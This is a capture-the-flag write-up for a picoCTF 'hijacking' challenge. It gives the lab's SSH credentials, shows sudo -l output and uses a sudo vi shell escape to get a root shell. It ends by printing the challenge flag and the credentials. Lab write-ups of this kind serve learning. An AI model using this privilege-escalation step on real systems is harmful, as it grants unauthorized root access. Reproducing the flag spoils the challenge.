# solution for hijacking challenge

1- connect to ssh server using these credentials:

``` bash

username:picoctf
password:  JZOjvisd1W
command: ssh picoctf@saturn.picoctf.net -p "port number" 

```

2- lisitng the files .

``` bash

picoctf@challenge:~$ ls -lah
total 16K
drwxr-xr-x 1 picoctf picoctf   20 Mar 25 14:26 .
drwxr-xr-x 1 root    root      21 Mar 16 02:08 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3.7K Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Mar 25 14:26 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py

```

3- checking the commands that we can execute with sudo

```bash

picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

```

4- since we can run vi with sudo , we can go for a privileg escalation using the following command:

```bash
vi -c ':!/bin/sh' /dev/null
```

5- now we have a root shell we can read the files in challenge directory using cmd or using the python file

``` bashh
picoctf@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null
[sudo] password for picoctf: 

# cat /challenge/metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}", "username": "picoctf", "password": "JZOjvisd1W"}
```
